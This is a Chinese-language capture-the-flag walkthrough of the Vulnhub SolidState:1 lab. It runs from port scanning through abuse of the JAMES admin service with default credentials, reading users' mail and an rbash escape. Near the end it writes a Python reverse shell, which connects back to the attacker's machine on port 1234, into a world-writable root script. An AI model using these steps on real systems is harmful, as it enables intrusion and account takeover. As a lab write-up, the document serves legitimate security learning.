---
title: SOLIDSTATE:1
date: 2024-03-17  
categories: [Training platform,Vulnhub]  
tags: [Vulnhub,web]  
permalink: "/Vulnhub/Solidstate1.html"
---

# SOLIDSTATE: 1

![image-20240317150623698](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403171944552.png)

扫一下，等一下：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403171944554.png" alt="image-20240317170537528" style="zoom:50%;" />

纳尼，还是扫一下吧：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403171944556.png" alt="image-20240317174431261" style="zoom:50%;" />

开始公鸡！

## 信息搜集

### 端口扫描

重启了一下，ip变了：

```bash
rustscan -a 192.168.37.131
```

```text
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
🌍HACK THE PLANET🌍

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 192.168.37.131:22
Open 192.168.37.131:119
Open 192.168.37.131:25
Open 192.168.37.131:80
Open 192.168.37.131:110
Open 192.168.37.131:4555
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-17 06:12 EDT
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 06:12
Completed NSE at 06:12, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 06:12
Completed NSE at 06:12, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 06:12
Completed NSE at 06:12, 0.00s elapsed
Initiating Ping Scan at 06:12
Scanning 192.168.37.131 [2 ports]
Completed Ping Scan at 06:12, 0.00s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 06:12
Completed Parallel DNS resolution of 1 host. at 06:13, 13.03s elapsed
DNS resolution of 1 IPs took 13.03s. Mode: Async [#: 1, OK: 0, NX: 0, DR: 1, SF: 0, TR: 3, CN: 0]
Initiating Connect Scan at 06:13
Scanning 192.168.37.131 [6 ports]
Discovered open port 25/tcp on 192.168.37.131
Discovered open port 80/tcp on 192.168.37.131
Discovered open port 22/tcp on 192.168.37.131
Discovered open port 110/tcp on 192.168.37.131
Discovered open port 119/tcp on 192.168.37.131
Discovered open port 4555/tcp on 192.168.37.131
Completed Connect Scan at 06:13, 0.00s elapsed (6 total ports)
Initiating Service scan at 06:13
Scanning 6 services on 192.168.37.131
Completed Service scan at 06:13, 21.06s elapsed (6 services on 1 host)
NSE: Script scanning 192.168.37.131.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 06:13
Completed NSE at 06:13, 11.21s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 06:13
Completed NSE at 06:13, 5.20s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 06:13
Completed NSE at 06:13, 0.00s elapsed
Nmap scan report for 192.168.37.131
Host is up, received syn-ack (0.00056s latency).
Scanned at 2024-03-17 06:13:01 EDT for 37s

PORT     STATE SERVICE     REASON  VERSION
22/tcp   open  ssh         syn-ack OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 77:00:84:f5:78:b9:c7:d3:54:cf:71:2e:0d:52:6d:8b (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCp5WdwlckuF4slNUO29xOk/Yl/cnXT/p6qwezI0ye+4iRSyor8lhyAEku/yz8KJXtA+ALhL7HwYbD3hDUxDkFw90V1Omdedbk7SxUVBPK2CiDpvXq1+r5fVw26WpTCdawGKkaOMYoSWvliBsbwMLJEUwVbZ/GZ1SUEswpYkyZeiSC1qk72L6CiZ9/5za4MTZw8Cq0akT7G+mX7Qgc+5eOEGcqZt3cBtWzKjHyOZJAEUtwXAHly29KtrPUddXEIF0qJUxKXArEDvsp7OkuQ0fktXXkZuyN/GRFeu3im7uQVuDgiXFKbEfmoQAsvLrR8YiKFUG6QBdI9awwmTkLFbS1Z
|   256 78:b8:3a:f6:60:19:06:91:f5:53:92:1d:3f:48:ed:53 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBISyhm1hXZNQl3cslogs5LKqgWEozfjs3S3aPy4k3riFb6UYu6Q1QsxIEOGBSPAWEkevVz1msTrRRyvHPiUQ+eE=
|   256 e4:45:e9:ed:07:4d:73:69:43:5a:12:70:9d:c4:af:76 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMKbFbK3MJqjMh9oEw/2OVe0isA7e3ruHz5fhUP4cVgY
25/tcp   open  smtp        syn-ack JAMES smtpd 2.3.2
|_smtp-commands: solidstate Hello nmap.scanme.org (192.168.37.128 [192.168.37.128]), PIPELINING, ENHANCEDSTATUSCODES
80/tcp   open  http        syn-ack Apache httpd 2.4.25 ((Debian))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Home - Solid State Security
110/tcp  open  pop3        syn-ack JAMES pop3d 2.3.2
119/tcp  open  nntp        syn-ack JAMES nntpd (posting ok)
4555/tcp open  james-admin syn-ack JAMES Remote Admin 2.3.2
Service Info: Host: solidstate; OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 06:13
Completed NSE at 06:13, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 06:13
Completed NSE at 06:13, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 06:13
Completed NSE at 06:13, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 50.75 seconds
```

### 目录扫描

看到打开了`80`端口，尝试进行扫描：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403171944557.png" alt="image-20240317181648603" style="zoom:50%;" />

```bash
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.37.131 -f -t 200
```

```bash
/icons/               (Status: 403) [Size: 295]
/assets/              (Status: 200) [Size: 1499]
/images/              (Status: 200) [Size: 2519]
/server-status/       (Status: 403) [Size: 303]
Progress: 220560 / 220561 (100.00%)
```

看来没啥好东西啊。。难道没查出来？换一个扫一下试试：

```bash
dirsearch -u http://192.168.37.131 -e* -i 200,300-399
```

```apl
[06:26:11] Starting:                                                                                                   
[06:26:16] 200 -    3KB - /about.html                                       
[06:26:26] 301 -  317B  - /assets  ->  http://192.168.37.131/assets/        
[06:26:26] 200 -  473B  - /assets/                                          
[06:26:37] 301 -  317B  - /images  ->  http://192.168.37.131/images/        
[06:26:37] 200 -  572B  - /images/                                          
[06:26:39] 200 -    6KB - /LICENSE.txt                                      
[06:26:49] 200 -  606B  - /README.txt                                                                                    
Task Completed 
```

### Wappalyzer插件分析

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403171944558.png" alt="image-20240317183306721" style="zoom: 50%;" />

## 漏洞利用

### 查看网页

到处点点。看看有没有有价值的信息，源代码也没发现啥有用的

### 查看敏感目录

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403171944559.png" alt="image-20240317182818096" style="zoom: 33%;" />

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403171944560.png" alt="image-20240317182833856" style="zoom: 33%;" />

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403171944561.png" alt="image-20240317183015568" style="zoom:33%;" />

没啥发现，看看其他的：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403171944562.png" alt="image-20240317183104045" style="zoom:50%;" />

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403171944563.png" alt="image-20240317183127595" style="zoom: 33%;" />

### 查看其他端口

扫出来了很多端口，看看其他的：

```apl
22,25,80,110,119,4555
```

刚刚信息搜集发现这个`4555`端口运行的是一个`james-admin syn-ack JAMES Remote Admin 2.3.2`，尝试进行连接：

```bash
┌──(kali㉿kali)-[~]
└─$ nc 192.168.37.131 4555
# JAMES Remote Administration Tool 2.3.2
# Please enter your login and password
# Login id:
admin
# Password:
password
# Login failed for admin
# Login id:
root
# Password:
password
# Login failed for root
# Login id:
root
# Password:
root
# Welcome root. HELP for a list of commands
HELP
# Currently implemented commands:
# help                                    display this help
# listusers                               display existing accounts
# countusers                              display the number of existing accounts
# adduser [username] [password]           add a new user
# verify [username]                       verify if specified user exist
# deluser [username]                      delete existing user
# setpassword [username] [password]       sets a user's password
# setalias [user] [alias]                 locally forwards all email for 'user' to 'alias'
# showalias [username]                    shows a user's current email alias
# unsetalias [user]                       unsets an alias for 'user'
# setforwarding [username] [emailaddress] forwards a user's email to another email address
# showforwarding [username]               shows a user's current email forwarding
# unsetforwarding [username]              removes a forward
# user [repositoryname]                   change to another user repository
# shutdown                                kills the current JVM (convenient when James is run as a daemon)
# quit                                    close connection
listusers
# Existing accounts 5
# user: james
# user: thomas
# user: john
# user: mindy
# user: mailadmin
countusers
# Existing accounts 5
```

发现了若干用户！！！

再试试其他的：

```bash
telnet 192.168.37.131 110
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403171944564.png" alt="image-20240317184726502" style="zoom: 50%;" />

忘了要密码了，使用上面那个程序看看能不能修改密码，不行就查漏洞了：

```bash
┌──(kali㉿kali)-[~]
└─$ nc 192.168.37.131 4555
# JAMES Remote Administration Tool 2.3.2
# Please enter your login and password
# Login id:
root
# Password:
root
# Welcome root. HELP for a list of commands
listusers
# Existing accounts 5
# user: james
# user: thomas
# user: john
# user: mindy
# user: mailadmin
setpassword james password
# Password for james reset
setpassword thomas password   
# Password for thomas reset
setpassword john password 
# Password for john reset
setpassword mindy password
# Password for mindy reset
setpassword mailadmin password
# Password for mailadmin reset
```

全改成 password 了，再去看一下 `110`端口的服务，`syn-ack JAMES pop3d 2.3.2`，这应该有个邮件服务器，尝试连接一下：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403171944565.png" alt="image-20240317191049242" style="zoom:50%;" />

![image-20240317191105177](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403171944566.png)

![image-20240317191117044](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403171944567.png)

意外收获，在`mindy`邮箱中得到了 ssh 凭证！

```apl
username: mindy
pass: P@55W0rd1!2@
```

### ssh登录

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403171944568.png" alt="image-20240317191257407" style="zoom: 50%;" />

## 提权

### 查看基础信息

是一个`rbash`，只能查些基础信息：

```text
mindy@solidstate:~$ ls -la
total 28
drwxr-x--- 4 mindy mindy 4096 Aug 22  2017 .
drwxr-xr-x 4 root  root  4096 Aug 22  2017 ..
-rw-r--r-- 1 root  root     0 Aug 22  2017 .bash_history
-rw-r--r-- 1 root  root     0 Aug 22  2017 .bash_logout
-rw-r--r-- 1 root  root   338 Aug 22  2017 .bash_profile
-rw-r--r-- 1 root  root  1001 Aug 22  2017 .bashrc
drwxr-x--- 2 mindy mindy 4096 Aug 22  2017 bin
-rw------- 1 root  root     0 Aug 22  2017 .rhosts
-rw------- 1 root  root     0 Aug 22  2017 .shosts
drw------- 2 root  root  4096 Aug 22  2017 .ssh
-rw------- 1 mindy mindy   34 Aug 22  2017 user.txt
mindy@solidstate:~$ cat user.txt
914d0a4ebc1777889b5b89a23f556fd75
```

获取到了flag！

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403171944569.png" alt="image-20240317191735435" style="zoom: 33%;" />

好麻烦很多命令运行不了尝试逃逸！

### rbash逃逸

#### 指定登录使用bash

```bash
ssh mindy@192.168.37.131 -t bash
```

![image-20240317192214636](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403171944570.png)

#### 也可以添加环境变量

```bash
ssh mindy@192.168.37.131 "export TERM=xterm; python -c 'import pty; pty.spawn(\"/bin/sh\")'"
```

### 信息搜集

```bash
$ uname -a 
# uname -a
# Linux solidstate 4.9.0-3-686-pae #1 SMP Debian 4.9.30-2+deb9u3 (2017-08-06) i686 GNU/Linux
$ find / -perm -u=s -type f 2>/dev/null
# find / -perm -u=s -type f 2>/dev/null
# /bin/su
# /bin/mount
# /bin/fusermount
# /bin/ping
# /bin/ntfs-3g
# /bin/umount
# /usr/bin/newgrp
# /usr/bin/pkexec
# /usr/bin/passwd
# /usr/bin/chsh
# /usr/bin/chfn
# /usr/bin/gpasswd
# /usr/sbin/pppd
# /usr/lib/policykit-1/polkit-agent-helper-1
# /usr/lib/openssh/ssh-keysign
# /usr/lib/eject/dmcrypt-get-device
# /usr/lib/dbus-1.0/dbus-daemon-launch-helper
# /usr/lib/xorg/Xorg.wrap
# /usr/lib/spice-gtk/spice-client-glib-usb-acl-helper
$ find / -type f -user root -perm -o=w 2>/dev/null     # 寻找user可执行的root权限文件
# find / -type f -user root -perm -o=w 2>/dev/null
# /opt/tmp.py
# ........
```

第一个就是`python`文件，看一下，剩下太多了，都是配置文件，先看`python`文件！还有一个`/sys/fs/cgroup/memory/cgroup.event_control`，一个一个来：

```bash
#!/usr/bin/env python
import os
import sys
try:
     os.system('rm -r /tmp/* ')
except:
     sys.exit()
```

这个脚本定期删除临时目录。

查看一下权限:

```bash
$ ls -l tmp.py
ls -l tmp.py
-rwxrwxrwx 1 root root 216 Mar 17 07:41 tmp.py
```

然后编写一下：

```bash
echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.37.128",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")' > /opt/tmp.py
```

kali设置一个监听，大概一两分钟就会弹一个`root shell`过来：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202403171944571.png" alt="image-20240317194320272" style="zoom:50%;" />

拿下这个靶机！
